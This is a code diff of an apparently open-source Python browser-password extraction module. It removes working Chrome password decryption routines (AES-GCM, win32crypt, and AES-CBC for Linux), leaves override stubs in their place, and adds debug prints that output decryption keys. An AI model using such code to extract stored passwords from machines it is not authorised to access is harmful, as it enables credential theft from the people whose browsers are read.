@@ -1,8 +1,8 @@
 import getpass
 import os
+import platform
 import shutil
 import sqlite3
-import sys
 from datetime import datetime, timedelta
 from pathlib import Path
 from typing import Union, Any
@@ -10,9 +10,6 @@ from typing import Union, Any
 from Crypto.Cipher import AES
 
 from passax.exceptions import *
-
-if os.name == "nt":
-    import win32crypt
 
 
 class ChromeBase:
@@ -27,71 +24,51 @@ class ChromeBase:
         self.values = []
 
         #  Determine which platform you are on
-        self.target_os = sys.platform
+        self.target_os = platform.system()
 
     @staticmethod
     def get_datetime(chromedate: Any) -> datetime:
-        """Return a `datetime.datetime` object from a chrome-like format datetime
+        """
+        Return a `datetime.datetime` object from a chrome-like format datetime
         Since `chromedate` is formatted as the number of microseconds since January, 1601"""
         return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
     def get_windows(self):
         """
-        Override function for this Windows class
+        Override function for this Windows method
         """
         pass
 
     def get_linux(self):
         """
-        Override function for this Linux class
+        Override function for this Linux method
         """
         pass
 
     @staticmethod
     def decrypt_windows_password(password, key) -> str:
-        """Input an encrypted password and return a decrypted one.
-        Windows method
         """
-        try:
-            # Get the initialization vector
-            iv = password[3:15]
-            password = password[15:]
-            # Generate cipher
-            cipher = AES.new(key, AES.MODE_GCM, iv)
-            # Decrypt password
-            return cipher.decrypt(password)[:-16].decode()
-
-        except:
-            try:
-                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
-
-            except Exception:
-                # Not handled error. Abort execution
-                raise NotImplemented
+        Override function for this Windows method.
+        Input an encrypted password and return a decrypted one.
+        """
 
     @staticmethod
     def decrypt_linux_password(password, key) -> str:
-        """Input an encrypted password and return a decrypted one.
+        """
+        Override function for this Linux method.
+        Input an encrypted password and return a decrypted one.
         Linux method
         """
-        try:
-            iv = b' ' * 16  # Initialization vector
-            password = password[3:]  # Delete the 3 first chars
-            cipher = AES.new(key, AES.MODE_CBC, IV=iv)  # Create cipher
-            return cipher.decrypt(password).strip().decode('utf8')
-
-        except Exception:
-            raise NotImplemented
 
     def retrieve_database(self) -> list:
-        """Retrieve all the information from the databases with encrypted values.
         """
-
-        if self.target_os == "win32":
+        Retrieve all the information from the databases with encrypted values.
+        """
+        if self.target_os == "Windows":
             temp_path = r"C:\Users\{}\AppData\Local\Temp".format(getpass.getuser())
             database_paths, keys = self.get_windows()
 
-        elif self.target_os == "linux":
+        elif self.target_os == "Linux":
             temp_path = "/tmp"
             database_paths, keys = self.get_linux()
 
@@ -99,6 +76,8 @@ class ChromeBase:
             raise OSNotSupported
 
         try:
+            print(database_paths)
+
             for database_path in database_paths:  # Iterate on each available database
                 # Copy the file to the temp directory as the database will be locked if the browser is running
                 filename = os.path.join(temp_path, "LoginData.db")
@@ -125,6 +104,7 @@ class ChromeBase:
                     date_last_used = row[5]
 
                     key = keys[database_paths.index(database_path)]
+                    print(key)
 
                     # Decrypt password
                     if self.target_os == "Windows":
@@ -200,7 +180,8 @@ class ChromeBase:
         return o
 
     def save(self, filename: Union[Path, str]) -> None:
-        """Save all the values to a desired path
+        """
+        Save all the values to a desired path
         :param filename: the filename (including the path to dst)
         :return: None
         """
